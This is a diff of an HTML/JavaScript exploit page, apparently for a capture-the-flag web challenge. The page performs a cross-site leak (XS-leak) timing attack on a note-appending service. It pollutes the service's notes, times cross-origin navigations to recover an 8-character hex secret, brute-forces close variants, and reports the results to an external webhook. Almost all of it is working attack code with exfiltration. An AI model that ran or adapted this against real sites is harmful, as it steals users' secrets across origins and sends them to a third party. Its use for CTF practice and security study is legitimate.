@@ -1,25 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head><title>Combined Attack</title></head>
+<head><title>XS-Leak Final</title></head>
 <body>
 <div id="s">Loading...</div>
 <script>
 var TARGET = "https://append-note-lcpbp.instancer.lac.tf";
 var WEBHOOK = "https://wild-cat-98.webhook.cool";
 var CHARS = "0123456789abcdef";
+var SAMPLES = 5; // samples per char per position
 
 function report(msg) {
     navigator.sendBeacon(WEBHOOK, msg);
     new Image().src = WEBHOOK + "?m=" + encodeURIComponent(msg);
 }
 
-report("COMBO_V1");
+report("FINAL_V1");
 
-// Test single prefix via form navigation
-function testPrefix(prefix) {
+// Measure actual load time via form navigation + polling
+function measureTime(content) {
     return new Promise(function(resolve) {
-        var url = TARGET + "/append?content=" + encodeURIComponent(prefix) + "&url=" + encodeURIComponent(TARGET + "/?r=" + Math.random());
+        var url = TARGET + "/append?content=" + encodeURIComponent(content) + "&url=" + encodeURIComponent(TARGET + "/?_=" + Math.random());
         var wname = "w" + Math.random().toString(36).slice(2);
+        
+        // Pre-open window to avoid popup blocker
+        var w = window.open("about:blank", wname);
         
         var form = document.createElement("form");
         form.method = "GET";
@@ -31,12 +35,53 @@ function testPrefix(prefix) {
         form.submit();
         document.body.removeChild(form);
         
-        setTimeout(function() {
-            var elapsed = performance.now() - t0;
-            try { window.open("", wname).close(); } catch(e) {}
-            resolve(elapsed);
-        }, 250);
+        // Poll for cross-origin error (= page loaded on target domain)
+        var tries = 0;
+        var maxTries = 500; // 5 seconds max
+        var iv = setInterval(function() {
+            tries++;
+            try {
+                // If we can read location, still on about:blank
+                var loc = w.location.href;
+                if (loc !== "about:blank") {
+                    // Navigated but still same-origin? Unlikely
+                }
+            } catch(e) {
+                // Cross-origin error = page loaded
+                clearInterval(iv);
+                var elapsed = performance.now() - t0;
+                try { w.close(); } catch(x) {}
+                resolve(elapsed);
+                return;
+            }
+            if (tries >= maxTries) {
+                clearInterval(iv);
+                var elapsed = performance.now() - t0;
+                try { w.close(); } catch(x) {}
+                resolve(elapsed);
+            }
+        }, 10);
     });
+}
+
+// Pollute notes with garbage to amplify timing difference
+async function pollute(count) {
+    report("POLLUTING_" + count);
+    for (var i = 0; i < count; i++) {
+        await measureTime("ZZZZZZ" + i); // Non-hex prefix, won't match real secret
+    }
+    report("POLLUTED");
+}
+
+// Get median of multiple measurements
+async function getMedianTime(prefix) {
+    var times = [];
+    for (var s = 0; s < SAMPLES; s++) {
+        var t = await measureTime(prefix);
+        times.push(t);
+    }
+    times.sort(function(a, b) { return a - b; });
+    return times[Math.floor(times.length / 2)];
 }
 
 async function trySecret(secret) {
@@ -54,55 +99,53 @@ async function trySecret(secret) {
 
 async function main() {
     report("START");
+    document.getElementById("s").textContent = "Starting...";
     
     try {
-        // Phase 1: Timing attack to get candidate secret
-        document.getElementById("s").textContent = "Phase 1: Timing...";
+        // Step 1: Pollute notes with 50 garbage entries
+        // This makes 404 slower (must check all notes) vs 200 (matches SECRET first)
+        document.getElementById("s").textContent = "Polluting...";
+        await pollute(30);
         
-        var secretFast = "";
-        var secretSlow = "";
-        var allData = [];
+        // Step 2: Timing attack
+        var secret = "";
         
         for (var pos = 0; pos < 8; pos++) {
-            document.getElementById("s").textContent = "T" + pos;
-            var results = [];
+            document.getElementById("s").textContent = "P" + pos + "/8: " + secret;
             
+            var results = [];
             for (var i = 0; i < CHARS.length; i++) {
                 var c = CHARS[i];
-                var time = await testPrefix(secretFast + c);
+                var time = await getMedianTime(secret + c);
                 results.push({ c: c, time: time });
             }
             
-            results.sort(function(a,b) { return a.time - b.time; });
-            allData.push(results);
+            // Sort by time - fastest should be correct (200 short-circuits on SECRET)
+            results.sort(function(a, b) { return a.time - b.time; });
             
-            secretFast += results[0].c;
-            secretSlow += results[results.length - 1].c;
+            var fastest = results[0];
+            var slowest = results[results.length - 1];
+            var gap = slowest.time - fastest.time;
             
-            report("P" + pos + ":" + results[0].c + "-" + results[results.length-1].c);
+            report("P" + pos + ":F=" + fastest.c + "(" + Math.round(fastest.time) + ")S=" + slowest.c + "(" + Math.round(slowest.time) + ")G=" + Math.round(gap));
+            
+            secret += fastest.c;
         }
         
-        report("TF=" + secretFast);
-        report("TS=" + secretSlow);
+        report("SECRET=" + secret);
         
-        // Phase 2: Try direct secrets
-        document.getElementById("s").textContent = "Phase 2: Testing...";
-        if (await trySecret(secretFast)) return;
-        if (await trySecret(secretSlow)) return;
+        // Step 3: Try the secret
+        document.getElementById("s").textContent = "Trying " + secret;
+        if (await trySecret(secret)) return;
         
-        // Phase 3: Bruteforce single-char variations
-        document.getElementById("s").textContent = "Phase 3: Bruteforce...";
-        
-        var bases = [secretFast, secretSlow];
-        for (var b = 0; b < bases.length; b++) {
-            var base = bases[b];
-            for (var pos = 0; pos < 8; pos++) {
-                for (var i = 0; i < CHARS.length; i++) {
-                    var c = CHARS[i];
-                    if (base[pos] === c) continue;
-                    var variant = base.substr(0, pos) + c + base.substr(pos + 1);
-                    if (await trySecret(variant)) return;
-                }
+        // Step 4: Bruteforce variations if timing was slightly off
+        report("BRUTEFORCE");
+        for (var pos = 0; pos < 8; pos++) {
+            for (var i = 0; i < CHARS.length; i++) {
+                var c = CHARS[i];
+                if (secret[pos] === c) continue;
+                var variant = secret.substr(0, pos) + c + secret.substr(pos + 1);
+                if (await trySecret(variant)) return;
             }
         }
         
